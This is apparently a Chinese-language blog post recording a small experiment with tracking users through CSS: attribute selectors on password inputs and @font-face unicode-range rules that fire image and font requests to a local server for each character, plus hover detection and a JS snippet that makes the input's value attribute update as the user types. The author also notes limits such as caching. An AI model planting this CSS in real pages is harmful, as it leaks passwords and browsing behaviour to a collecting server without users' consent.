# CSS追踪用户浏览行为的初步探索

这个话题其实很早的时候就有了，挺有意思的，于是我拿来做了一个小的实验，感兴趣的可以在文末的Reference中阅读更多相关的资料。

## 导读

这个问题要先从跨域请求说起。由于浏览器的同源策略控制了不同源之间的交互，所以当两个页面的协议，端口和域名不同的情况下会存在跨域问题，这时候不做特殊处理发送的请求是不会被处理的。一般是通过CORS来进行跨源访问，但是也有一些其他情况(这里需要说明对于跨域我了解的不是很多，准备之后好好研究一下,所以可能会挖一些坑)，比如说`script`中的`src`,`link`中的`href`,在像`img`中支持嵌入`png,jpg,gif,bmp.svg...`,`vedio`等这些标签加载资源的过程就是发送了一个`http`请求，拿`img`举个例子，加载第三方网站的图片`<img src="http://demo.com/1.jpg">`就引入了第三方的图片，但貌似浏览器并没有在`console`中发起跨域的警告和报错，所以类似的情况就可能被利用，达到跨域获取信息的可能。



## CSS追踪用户浏览行为

上面讲的多事标签和js实现的过程，我们知道在推荐系统盛行的当下，获取用户的浏览行为是必不可上的，很多实现都是通过js脚本实现的，这里学着网上的大佬扒一扒css的实现。我主要是尝试了两个功能

* css记录input的按键值
* css鼠标悬停检测

### 记录按键的值

主要原理是下面的CSS代码

```css
input[type="password"][value$="0"] { background-image: url("http://localhost:3000/0"); }
```

通过CSS选择器选择`type`为`password`,`value`的结尾是`0`的输入框，添加背景图片，图片加载自网络，这时就发送了一个请求到我的本地服务器，这里若是要远程使用，换成自己的域名或者ip地址。同样的设计所有ascii码，这样就能够获取到用户的按键输入。

### 鼠标悬停

```css
img:hover{
    background-image: url("http://localhost:3000/我悬停在图片上")
}
```

鼠标悬停也是通过`background-image`的方式发送请求，下面是两次实验的截图

![](https://ws1.sinaimg.cn/large/eb59d62cly1fvcjay7k3ij21bs0f2n6m.jpg)

![](https://ws1.sinaimg.cn/large/eb59d62cly1fvcjglzduvj207s07z0sr.jpg)

还有一种是通过字体发送请求

```
@font-face { font-family: x; src: url("http://localhost:3000/a"), local(Impact); unicode-range: U+61; }
@font-face { font-family: x; src: url("http://localhost:3000/b"), local(Impact); unicode-range: U+62; }
@font-face { font-family: x; src: url("http://localhost:3000/c"), local(Impact); unicode-range: U+63; }
@font-face { font-family: x; src: url("http://localhost:3000/d"), local(Impact); unicode-range: U+64; }
input { font-family: x, 'Comic sans ms'; }
```

也是通过枚举的方式试着`unicode-range`来匹配输入。

## 思考

我做了很多尝试，开始的时候并没有成功，这是因为用户在输入的时候`input`标签并不会把输入的是更新到属性`value`上，这样一来css样式选择的时候就只能匹配原来的设置的默认值导致始终不能够触发请求。后来是使用了一段js脚本强制更新属性值`value`添加了监听事件。

```js
var inps = document.getElementsByTagName("input");
        for(let i =0;i<inps.length;i++){
            inps[i].addEventListener("keyup",(e)=>{
            inps[i].setAttribute('value',inps[i].value);
        })
        }
```

也就是说记录按键是要在特定的情况下，比如一些框架的值的双向绑定，我只是用过vue,经过实验在上面不可行，但是其他的CSS样式入鼠标悬停等都是可以的。

说不安全也不安全，说安全也安全毕竟不是普遍的都会强制更新value值。



另外还有一个问题就是浏览器有缓存，我们加载的多是图片和字体，所以在某种程度上都会缓存在浏览器中，这样的话在输入两个`1`的时候只会发送一个请求`http://localhost:3000/1`,因为之前加载过一次，但是这也已经缩小了暴力破解的字母表。

## Reference

* [Heaker News: A CSS Keylogger](https://news.ycombinator.com/item?id=16422696)
* [第三方CSS并不安全](https://juejin.im/entry/5aa08de05188255581548435)
* [MDN CSS](https://developer.mozilla.org/zh-CN/docs/Web/CSS)
* [Crooked Style Sheets](https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md)
* [浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)





